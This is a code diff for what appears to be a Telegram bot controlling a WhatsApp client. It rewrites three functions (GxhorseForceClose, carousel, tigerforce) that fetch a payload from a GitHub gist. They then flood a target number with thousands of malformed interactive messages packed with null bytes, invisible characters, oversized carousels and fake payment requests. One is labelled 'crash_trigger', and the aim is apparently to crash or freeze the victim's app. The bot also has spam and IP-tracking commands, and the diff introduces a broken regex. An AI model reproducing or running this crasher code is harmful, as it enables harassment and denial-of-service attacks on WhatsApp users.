@@ -98,7 +98,7 @@ bot.onText(/\/tspam (.+) (.+) (.+) (.+)/, async (msg, match) => {
 });
 
 // --- 3. OSINT ---
-bot.onText(/\/track (.+) ip/, async (msg, match) => {
+bot.onText(/\/track (.+) (.+), async (msg, match) => {
     try {
         const res = await axios.get(`http://ip-api.com/json/${match[1]}`);
         const d = res.data;
@@ -260,30 +260,286 @@ async function delayMakerInvisible(target) {
                              }
 
 async function GxhorseForceClose(tqw) {
-    const res = await axios.get('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
-    let apiClient = res.data;
-    for (let r = 0; r < 20; r++) {
-        const msg = await generateWAMessageFromContent(tqw, { viewOnceMessage: { message: { interactiveMessage: { body: { text: "Stormy Ascent" }, nativeFlowMessage: { buttons: [{ name: "single_select", buttonParamsJson: JSON.stringify(apiClient) }] } } } } }, {});
-        await sock.relayMessage(tqw, msg.message, { participant: { jid: tqw } });
-        await sleep(2000);
-    }
+  // Ambil data API dari gist
+  let apiClient;
+  try {
+    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
+    apiClient = await res.text();
+  } catch (err) {
+    console.error("error fetching", err);
+    return;
+  }
+
+  for (let r = 0; r < 9999; r++) {
+    const msg = await generateWAMessageFromContent(
+      tqw,
+      {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              contextInfo: {
+                participant: "0@s.whatsapp.net",
+                remoteJid: "X",
+                mentionedJid: [tqw],
+                forwardedNewsletterMessageInfo: {
+                  newsletterName: "Shimiezu",
+                  newsletterJid: "120363389269945426@newsletter",
+                  serverMessageId: 1
+                },
+                externalAdReply: {
+                  showAdAttribution: true,
+                  title: "Stormy Ascent",
+                  body: "",
+                  thumbnailUrl: null,
+                  sourceUrl: "https://tama.app/",
+                  mediaType: 1,
+                  renderLargerThumbnail: true
+                },
+                businessMessageForwardInfo: {
+                  businessOwnerJid: tqw,
+                },
+                dataSharingContext: {
+                  showMmDisclosure: true,
+                },
+                quotedMessage: {
+                  paymentInviteMessage: {
+                    serviceType: 1,
+                    expiryTimestamp: null
+                  }
+                }
+              },
+              header: {
+                title: "",
+                hasMediaAttachment: false
+              },
+              body: {
+                text: "Stormy Ascent",
+              },
+              nativeFlowMessage: {
+                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: apiClient + "Stormy Ascent",
+                  },
+                  {
+                    name: "call_permission_request",
+                    buttonParamsJson: apiClient + "Stormy Ascent",
+                  },
+                  {
+                    name: "payment_method",
+                    buttonParamsJson: ""
+                  },
+                  {
+                    name: "payment_status",
+                    buttonParamsJson: ""
+                  },
+                  {
+                    name: "review_order",
+                    buttonParamsJson: ""
+                  },
+                ],
+              },
+            },
+          },
+        },
+      },
+      {}
+    );
+
+    await sock.relayMessage(tqw, msg.message, {
+      participant: { jid: tqw },
+      messageId: msg.key.id
+    });
+
+    await sleep(5000);
+    console.log("The Stormy Ascent");
+  }
 }
 
 async function carousel(sock, target) {
-    let push = [];
-    for (let i = 0; i < 5; i++) {
-        push.push({ body: { text: "\u0000".repeat(500) }, header: { title: 'Stormy Ascent', hasMediaAttachment: true, imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc" } } });
-    }
-    const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { carouselMessage: { cards: push } } } } }, {});
-    await sock.relayMessage(target, msg.message, { participant: { jid: target } });
+ let haxxn = 60;
+
+ for (let i = 0; i < haxxn; i++) {
+ let push = [];
+ let buttt = [];
+
+ for (let i = 0; i < 5; i++) {
+ buttt.push({
+ "name": "galaxy_message",
+ "buttonParamsJson": JSON.stringify({
+ "header": "null",
+ "body": "xxx",
+ "flow_action": "navigate",
+ "flow_action_payload": { screen: "FORM_SCREEN" },
+ "flow_cta": "Grattler",
+ "flow_id": "1169834181134583",
+ "flow_message_version": "3",
+ "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+ })
+ });
+ }
+
+ for (let i = 0; i < 9999; i++) {
+ push.push({
+ "body": {
+ "text": "\u0000\u0000\u0000\u0000\u0000"
+ },
+ "footer": {
+ "text": ""
+ },
+ "header": {
+ "title": 'Stormy Ascent ϟ\u0000\u0000\u0000\u0000',
+ "hasMediaAttachment": true,
+ "imageMessage": {
+ "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+ "mimetype": "image/jpeg",
+ "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+ "fileLength": "591",
+ "height": 0,
+ "width": 0,
+ "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+ "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+ "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+ "mediaKeyTimestamp": "1721344123",
+ "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+ "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
+ "scanLengths": [
+ 247,
+ 201,
+ 73,
+ 63
+ ],
+ "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
+ }
+ },
+ "nativeFlowMessage": {
+ "buttons": []
+ }
+ });
+ }
+
+ const carousel = generateWAMessageFromContent(target, {
+ "viewOnceMessage": {
+ "message": {
+ "messageContextInfo": {
+ "deviceListMetadata": {},
+ "deviceListMetadataVersion": 2
+ },
+ "interactiveMessage": {
+ "body": {
+ "text": "\u0000\u0000\u0000\u0000"
+ },
+ "footer": {
+ "text": "Stormy Ascent"
+ },
+ "header": {
+ "hasMediaAttachment": false
+ },
+ "carouselMessage": {
+ "cards": [
+ ...push
+ ]
+ }
+ }
+ }
+ }
+ }, {});
+await sock.relayMessage(target, carousel.message, {
+messageId: carousel.key.id,
+participant: { jid: target }
+ });
+ }
 }
 
+
 async function tigerforce(target, sock) {
-    const res = await axios.get('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
-    let apiClient = res.data;
-    for (let i = 0; i < 15; i++) {
-        const msg = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { interactiveMessage: { nativeFlowMessage: { buttons: [{ name: "single_select", buttonParamsJson: JSON.stringify(apiClient) }] } } } } }, {});
-        await sock.relayMessage(target, msg.message, { participant: { jid: target } });
-        await sleep(2000);
-    }
+  // Ambil data button dari API eksternal
+  let apiClient;
+  try {
+    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
+    apiClient = await res.text();
+  } catch (err) {
+    console.error('Gagal fetch API:', err);
+    return;
+  }
+
+  for (let i = 0; i < 333; i++) {
+    try {
+      const msg = await generateWAMessageFromContent(
+        target,
+        {
+          viewOnceMessage: {
+            message: {
+              interactiveMessage: {
+                contextInfo: {
+                  mentionedJid: [target],
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target
+                  },
+                  externalAdReply: {
+                    showAdAttribution: true,
+                    title: String.fromCharCode(8206).repeat(500),
+                    body: String.fromCharCode(8206).repeat(500),
+                    sourceUrl: "https://wa.me/0",
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                    thumbnailUrl: null
+                  },
+                  quotedMessage: {
+                    requestPaymentMessage: {
+                      currencyCodeIso4217: "USD",
+                      amount1000: 999999,
+                      requestFrom: target
+                    }
                   }
+                },
+                header: {
+                  title: String.fromCharCode(8206).repeat(300),
+                  hasMediaAttachment: false
+                },
+                body: {
+                  text: String.fromCharCode(8206).repeat(1000)
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: JSON.stringify({
+                    name: "crash_trigger",
+                    title: "",
+                    header: "",
+                    body: ""
+                  }),
+                  buttons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)
+                    },
+                    {
+                      name: "review_order",
+                      buttonParamsJson: apiClient + String.fromCharCode(8206).repeat(100)
+                    }
+                  ]
+                }
+              }
+            }
+          }
+        },
+        {}
+      );
+
+      await sock.relayMessage(target, msg.message, {
+        messageId: msg.key.id
+      });
+
+      console.log(`Stormy Ascent v1 [${i + 1}/333] to ${target}`);
+      await sleep(3000);
+
+    } catch (err) {
+      console.error("Gagal kirim bug:", err);
+      break;
+    }
+  }
+}
